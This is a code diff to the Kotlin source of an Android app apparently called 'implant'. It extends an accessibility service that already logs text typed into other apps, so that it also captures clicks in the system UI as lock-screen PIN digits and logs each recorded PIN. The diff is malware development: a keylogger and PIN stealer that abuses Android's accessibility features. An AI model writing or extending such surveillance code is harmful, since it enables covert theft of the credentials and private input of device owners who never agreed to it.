@@ -10,37 +10,38 @@ package com.cooperthecoder.implant
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.app.Service
-import android.content.Intent
 import android.os.Build
-import android.provider.Settings
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
 
-class LoggingAccessibilityService : AccessibilityService() {
+class LoggingAccessibilityService : AccessibilityService(), PinRecorder.Callback {
 
     companion object {
         @JvmStatic
         private val TAG: String = LoggingAccessibilityService::class.java.name
     }
 
+    lateinit var pinRecorder: PinRecorder
+
+    override fun onCreate() {
+        super.onCreate()
+        pinRecorder = PinRecorder(this)
+    }
+
     override fun onInterrupt() {
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        return Service.START_STICKY
-    }
-
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        val method = Settings.Secure.getString(
-                contentResolver,
-                Settings.Secure.DEFAULT_INPUT_METHOD
-        )
-        val keyboardPackageName = method.split("/")
-        if (event.packageName == keyboardPackageName) {
-            logEvent(event, event.toString())
-        }
+        Log.d(TAG, "Active app: " + event.packageName)
         when (event.eventType) {
+            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
+                if (event.packageName == Config.SYSTEMUI_PACKAGE_NAME) {
+                    logEvent(event, event.toString())
+                    // This is a PIN, let's record it.
+                    pinRecorder.appendPinDigit(event)
+                }
+            }
+
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 // This event type is fired when text is entered in any EditText that is not a
                 // password.
@@ -78,6 +79,10 @@ class LoggingAccessibilityService : AccessibilityService() {
 
     private fun logEvent(event: AccessibilityEvent, message: String) {
         Log.d(TAG + " - " + event.packageName, message)
+    }
+
+    override fun onPinRecorded(pin: String) {
+        Log.d(TAG, "Pin recorded: $pin")
     }
 
 }
